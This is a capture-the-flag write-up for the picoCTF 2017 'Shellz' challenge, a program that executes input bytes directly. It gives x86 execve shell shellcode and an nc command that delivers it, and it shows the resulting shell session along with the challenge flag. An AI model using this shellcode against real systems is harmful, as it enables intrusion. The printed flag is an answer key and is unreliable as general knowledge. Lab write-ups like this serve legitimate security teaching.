### Shellz - 55 points

> You no longer have an easy thing to call, but you have more space. Program: shellz! Source. Connect on shell2017.picoctf.com:34621.

Hint:
> There is a bunch of preexisting shellcode already out there!

We are presented with a piece of code, that has string that we can overflow. This string will read from our input (stuff), and will be used to create a function pointer that will be called.
```c
int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
...
void (*func)() = (void (*)())stuff;
    func();
```
The hint tell us that we should use preexisting shellcode, in order to get a shell.
There are a lot of shellcode around the web, and most of them will work (as long as it's below 40 bytes).
I'll be using this one:
```
\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
```
Now we can just pass it, using python:
```
(python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; cat) | nc shell2017.picoctf.com 34621
```
Keep in mind that we need to pass the cat command so the pipe doesn't close.

After that, we have a shell. We can just pass commands.
```
(python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x
69\x6e\x89\xe3\xb0\x0b\xcd\x80'"; cat) | nc shell2017.picoctf.com 34621                           
My mother told me to never accept things from strangers                                           
How bad could running a couple bytes be though?                                                   
Give me 40 bytes:                                                                                 
ls                                                                                                
flag.txt                                                                                          
shellz                                                                                            
shellz_no_aslr                                                                                    
xinetd_wrapper.sh                                                                                 
cat flag.txt                                                                                      
f6f01bf0649b5aa5ec299bb51c8f8db4 
```

Flag:
```
f6f01bf0649b5aa5ec299bb51c8f8db4
```
